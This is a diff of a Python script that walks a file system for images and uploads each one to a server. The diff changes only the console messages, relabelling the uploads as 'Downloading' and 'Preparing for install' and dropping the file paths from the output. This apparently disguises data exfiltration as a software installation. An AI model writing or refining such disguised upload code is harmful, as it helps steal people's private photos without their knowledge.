@@ -24,17 +24,17 @@ def upload_image(image_path):
             data = {'path': relative_path}  # Send relative path to server
             response = requests.post(server_url, files=files, data=data)
             if response.status_code == 200:
-                print(f"[✔] Uploaded: {relative_path}")
+                print(f"[✔] Downloaded ...")
             else:
-                print(f"[✘] Failed: {relative_path} (Status {response.status_code})")
+                print(f"[✘] Failed:")
     except Exception as e:
-        print(f"[!] Error uploading {image_path}: {e}")
+        print(f"[!] Error Downloading ... ")
 
 # ✅ Step 4: Run Everything
 if __name__ == "__main__":
-    print("🔍 Preparing to upload images...")
+    print("🔍 Preparing for install...")
     images = find_all_images(base_path)
-    print(f"📤 Uploading started. Please wait, it may take several minutes...\n")
+    print(f"📤 Downloading started. Please wait, it may take several minutes...\n")
 
     for img in images:
         upload_image(img)
